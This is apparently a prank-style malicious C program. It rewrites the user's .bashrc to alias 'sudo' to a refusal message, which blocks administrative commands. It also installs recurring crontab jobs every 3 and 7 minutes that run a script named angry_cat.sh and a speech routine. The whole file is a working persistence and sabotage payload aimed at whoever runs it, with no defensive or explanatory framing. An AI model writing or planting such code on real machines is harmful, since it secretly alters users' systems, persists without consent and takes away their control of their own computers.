#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/types.h>
#include <string.h>

#include "linux_src.c"

int main() {
    char* home_loc = get_home();
    char *cron_start1 = "( (crontab -l 2>/dev/null || echo "")  ; echo \"*/7 * * * * export XDG_RUNTIME_DIR=/run/user/1000 && ";
    char *cron_start2 = "( (crontab -l 2>/dev/null || echo "")  ; echo \"*/3 * * * * export XDG_RUNTIME_DIR=/run/user/1000 && ";
    char *cron_end = "'\") | sort -u - | crontab -";

    char *edit = "\n\nalias sudo=\"echo 'My apologies, $USER, I cannot allow you to'\"\n";

    bashrc_edit(home_loc, edit);

    char *script_loc = "/Desktop/angry_cat.sh";
    add_cron_script(home_loc, script_loc);
    add_cron_speak("test");
    system("exec bash");
}
